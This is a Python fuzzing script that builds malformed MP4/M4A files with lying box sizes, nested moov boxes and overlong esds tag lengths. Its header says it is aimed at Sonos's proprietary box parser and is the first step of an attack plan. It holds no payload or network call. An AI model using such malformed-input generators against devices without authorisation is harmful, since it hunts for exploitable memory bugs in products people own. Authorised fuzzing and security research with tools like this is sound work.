#!/usr/bin/env python3
"""mp4mut.py - minimal ISO-BMFF (MP4/M4A) files with lying box sizes.

Target: Sonos's own box walker (not ffmpeg) - RE strings include
`corrupt file: no moov`, `bad moof`, `required size:%zu available:%zu`,
`size:%zu pos:%zu`, `resync required`. Those messages are the branch oracle;
the walker reads ftyp/moov/mdat/moof, esds TLVs and the ALAC `stsd`.

Each mode emits a structurally plausible file whose *size fields* lie, which is
the first experiment the attack ranking prescribes.

usage:
  mp4mut.py OUT --mode SIZE0|SIZEMAX|SIZESHORT|NESTED|NOFTYP|ESDSCNT
"""
import argparse
import struct

FTYP = b"ftyp"
MOOV = b"moov"
MDAT = b"mdat"
TRAK = b"trak"
MDIA = b"mdia"
MINF = b"minf"
STBL = b"stbl"
STSD = b"stsd"
ESDS = b"esds"
FREE = b"free"


def box(kind: bytes, body: bytes, size: int | None = None) -> bytes:
    return struct.pack(">I", size if size is not None else 8 + len(body)) + kind + body


def ftyp() -> bytes:
    return box(FTYP, b"M4A " + struct.pack(">I", 0) + b"M4A isomiso2mp41")


def stsd_body() -> bytes:
    # one alac sample entry with the ALAC magic, truncated cookie
    cookie = b"\x00\x00\x00\x00alac" + struct.pack(">I", 0) + bytes(12)
    return struct.pack(">I", 0) + struct.pack(">I", 1) + \
        struct.pack(">I", 8 + len(cookie)) + b"alac" + bytes(28) + cookie


def moov_body(nest: bool) -> bytes:
    stsd = box(STSD, stsd_body())
    stbl = box(STBL, stsd)
    minf = box(MINF, stbl)
    mdia = box(MDIA, minf)
    trak = box(TRAK, mdia)
    body = trak
    if nest:
        body = box(MOOV, trak)          # moov inside moov
    return body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("out")
    ap.add_argument("--mode", default="SIZE0")
    ap.add_argument("--payload", type=lambda s: int(s, 0), default=0x400)
    a = ap.parse_args()

    parts = [ftyp()]
    if a.mode == "NOFTYP":
        parts = []

    if a.mode == "SIZE0":
        parts.append(box(MOOV, moov_body(False), size=0))       # 0 = "to EOF"
    elif a.mode == "SIZEMAX":
        parts.append(box(MOOV, moov_body(False), size=0xFFFFFFFF))
    elif a.mode == "SIZESHORT":
        parts.append(box(MOOV, moov_body(False), size=8))       # < header+body
    elif a.mode == "NESTED":
        parts.append(box(MOOV, moov_body(True)))
    elif a.mode == "ESDSCNT":
        # esds whose declared tag count runs far past the box
        esds = struct.pack(">I", 0) + b"\x03" + b"\x80\x80\x80\x7f" + bytes(8)
        parts.append(box(MOOV, box(TRAK, box(MDIA, box(MINF, box(STBL,
                     box(STSD, struct.pack(">I", 0) + struct.pack(">I", 1)
                         + struct.pack(">I", 24) + b"alac" + bytes(8)
                         + box(ESDS, esds))))))))
    else:
        parts.append(box(MOOV, moov_body(False)))

    parts.append(box(MDAT, bytes(a.payload)))
    data = b"".join(parts)
    open(a.out, "wb").write(data)
    print("wrote %s (%d bytes, mode=%s)" % (a.out, len(data), a.mode))


if __name__ == "__main__":
    main()
